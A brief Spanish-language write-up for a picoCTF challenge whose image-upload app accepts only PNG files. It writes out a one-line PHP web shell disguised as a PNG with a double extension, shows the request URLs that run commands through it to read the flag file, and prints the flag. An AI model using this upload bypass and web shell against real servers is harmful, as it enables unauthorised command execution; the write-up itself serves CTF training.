
## DESCRIPCIÓN
I found a web app that can help process images: PNG images only!

Try it [here](http://atlas.picoctf.net:60813/)!
## SOLUCIÓN
La pagina subiendo un archivo PNG, para resolverlo subimos un web shell, primero lo creamos y lo camuflamos como PNG, colocando PNG al inicio, que es lo primero que lee:

```bash
nano shell.png.php

PNG<?php if(isset($_REQUEST['cmd'])) system($_REQUEST['cmd']); ?>
```
lo subimos y ya podemos acceder a el desde la carpeta de uploads, encontramos el archivo en donde esta la flag y lo leemos:

```
http://atlas.picoctf.net:59968/uploads/shell.png.php?cmd=ls -l ..

http://atlas.picoctf.net:59968/uploads/shell.png.php?cmd=cat /var/www/html/MQZWCYZWGI2WE.txt
```

y obtenemos la flag:

picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
## NOTAS ADICIONALES

## REFERENCIAS





